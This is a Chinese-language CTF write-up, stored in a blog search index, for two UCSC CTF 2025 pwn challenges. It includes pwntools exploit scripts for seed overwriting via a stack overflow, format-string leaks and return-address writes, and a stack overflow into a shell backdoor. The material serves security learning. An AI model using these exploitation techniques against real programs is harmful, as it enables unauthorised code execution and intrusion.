<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>UCSC CTF 2025 WP</title>
      <link href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/"/>
      <url>/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="UCSC-CTF-2025-WP-—-PWN"><a href="#UCSC-CTF-2025-WP-—-PWN" class="headerlink" title="UCSC CTF 2025 WP —- PWN"></a>UCSC CTF 2025 WP —- PWN</h2><h3 id="BoFido"><a href="#BoFido" class="headerlink" title="BoFido"></a>BoFido</h3><p><img src="/../WP/UCSC2025/1.png" alt="1"></p><p>常规检查： 64位程序 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/2.png" alt="2"></p><p>主函数的代码逻辑非常的简单 循环十次 每次循环创造三个随机数 让玩家进行猜数游戏</p><p>程序中还存在明显的system(“&#x2F;bin&#x2F;sh”)后门函数调用 </p><p>要想进入这个后门函数 我们就必须要满足 v14 &#x3D;&#x3D; 10 这一个条件</p><p>而 v14 这个变量在程序中的作用是统计全猜中的次数 每个回合三个数字全部猜中 v14 的值就会加一 但由于进行猜数的回合只有十次 所以我们若想要进行后门函数调用 最直接的方法就必须要每一个回合都把三个数给猜对 </p><p>但是如果是一直乱猜 明显是不太现实（比彩票中大奖的概率还低）<strong>所以这就需要我们来控制赌局的中奖率</strong> 从而达到把把全猜中的目的</p><p><strong><u>那么我们该如何利用漏洞进行实现呢？</u></strong></p><p><img src="/../WP/UCSC2025/3.png" alt="image-20250422234155656"></p><p>我们想要控制中奖率 就必须要知道 随机数是如何进行生成的：</p><hr><ul><li>C 语言提供了 <code>rand()</code> 函数来生成随机数，该函数通常基于线性同余法等算法实现。每次调用 <code>rand()</code> 函数时，它会根据内部的种子和算法生成下一个随机数。</li></ul><hr><p>但是如果程序每次都利用相同的种子，那么生成的随机数序列也会相同，这样就无法得到真正的随机数，所以通常我们都会以当前时间作为种子，因为时间是无时无刻发生变化的，这样生成的数值才会满足随机性。</p><p><strong>seed &#x3D; time(0LL)</strong></p><p>这行代码的作用是初始化时间的种子 这样我们得到的随机数就是完全随机的了</p><p>这样就不方便我们进行对赌局的把控 </p><p>转念一想，如果生成随机数是根据内部的种子和固定的算法决定的，这个种子因为程序进行了时间初始化，导致种子在不断变化，但如果我们在其生成时间的种子之后，对seed进行一个覆盖，把它覆盖为一个固定大小的值，<strong><u>这样我们生成的随机数序列就会变得有迹可循</u></strong></p><p><u>如果你能够预知未来，这样的赌局还会存在失误吗…..</u></p><h5 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h5><p>由于程序给我们提供了一个0x25字节的输入点 恰好这个输入点存在一个漏洞 让我们进行一个利用</p><p><img src="/../WP/UCSC2025/4.png" alt="image-20250422235747015"></p><p>可以看到输入点 buf 和随机数种子 seed 都存在于栈上，并且相距0x20字节（恰好在0x25输入范围以内）只要我们填充数据0x21个字节把seed覆盖成一个固定的值 这样随机数序列也会固定</p><p><img src="/../WP/UCSC2025/5.png" alt="image-20250423000924364"></p><p>我选择直接填充0x21个的a字节，第一次运行程序记下十个回合的幸运数字，第二次运行程序直接按第一个回合的顺序打就可以直接打通</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="userlogin"><a href="#userlogin" class="headerlink" title="userlogin"></a>userlogin</h3><p><img src="/../WP/UCSC2025/6.png" alt="image-20250423124813045"></p><p>常规检查：64位 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/7.png" alt="image-20250423124845602"></p><p>main（）函数和 generatePassword（）函数没有什么不对劲的地方 我们直接看login（）函数</p><p>login（）函数：</p><p><img src="/../WP/UCSC2025/8.png" alt="image-20250423125310204"></p><p>存在一个输入点，输入大小是32字节，随后strcmp函数对输入的字符串进行对照</p><ol><li><p>supersecureuser</p><p>如果输入的字符串为“supersecureuser”，则进入user（）函数</p></li><li><p>随机字符串</p><p>如果输入的字符串为 a1 ，则进入root（）函数，但是由于 a1 涉及到随机数，所以 a1 具有不确定性，很难对其进行预测</p><h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>user（）函数：</p></li></ol><p><img src="/../WP/UCSC2025/9.png" alt="image-20250423131703908"></p><p>user（）函数内部有一个明显的格式化字符串漏洞 并且由于 main（）函数内for循环的关系，我们可以连续进入三次 login（）函数，从而我们就拥有三次格式化字符串漏洞利用的机会</p><p>同时程序存在shell（）后门函数：</p><p><img src="/../WP/UCSC2025/10.png" alt="image-20250423132447202"></p><h5 id="做题思路：-1"><a href="#做题思路：-1" class="headerlink" title="做题思路："></a>做题思路：</h5><p>1.利用格式化字符串漏洞泄露出返回地址</p><p>2.将返回地址写入栈上 并改返回地址的内容为后门函数的地址</p><p><img src="/../WP/UCSC2025/11.png" alt="image-20250423135436505"></p><p>挑选了一个栈上的一个地址，打算对这个地址进行一个泄露，随后计算出它与返回地址的固定偏移，利用泄露出来的地址加上固定偏移，得到的结果就是返回地址了</p><p><img src="/../WP/UCSC2025/12.png" alt="image-20250423135740277"></p><p>fmtarg 可以计算出泄露地址的偏移是 %7 </p><p>第一段payload就可以构造出来了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;%7$p&#x27;</span><br></pre></td></tr></table></figure><p>这段payload可以直接把内容作为指针泄露出来 计算出固定偏移为 0x38，这样我们就得到了返回地址</p><p>第二次格式化字符串漏洞，我们先把返回地址写入栈上，紧接着对它进行修改，将其指向shell（）后门函数</p><p><img src="/../WP/UCSC2025/13.png" alt="image-20250423185521207"></p><p>可以看到，最初的返回地址指向的是0x4154b这个地址</p><p><img src="/../WP/UCSC2025/14.png" alt="image-20250423185607974"></p><p>我们需要将它改写为0x401265这个地址，也就是需要改写两个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br></pre></td></tr></table></figure><p><img src="/../WP/UCSC2025/15.png" alt="image-20250423190714979"></p><p>可以看到返回地址已经被成功改写</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;retn  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(retn))                  </span><br><span class="line">fmt()</span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>解法二相对于解法一来说 确实较为简单 </p><p><img src="/../WP/UCSC2025/16.png" alt="image-20250423195504888"></p><p>已知user（）函数中存在格式化字符串漏洞，经过测试发现root用户的密码正是上图红框的位置，</p><p>只要通过字格泄露出root的密码，这样我们就可以进入root（）函数</p><p>root（）函数：</p><p><img src="/../WP/UCSC2025/17.png" alt="17"></p><p>root（）函数具有明显的栈溢出漏洞，由于我们已经知道了shell的地址，所以这题可以通过root（）函数，栈溢出直接劫持返回地址指向shell函数</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$s&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">password = p.recvuntil(<span class="string">&quot;Password:&quot;</span>)[:-<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password  &gt;&gt; &quot;</span> + <span class="built_in">str</span>(password))</span><br><span class="line">p.sendline(password)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Note: \n&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后一题看其他师傅有的是用IO解出来的，但是我还没有学，所以先放一放</p><p>其实应该是还有一种非IO的解法 到时候我在更新。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UCSC CTF 2025 WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
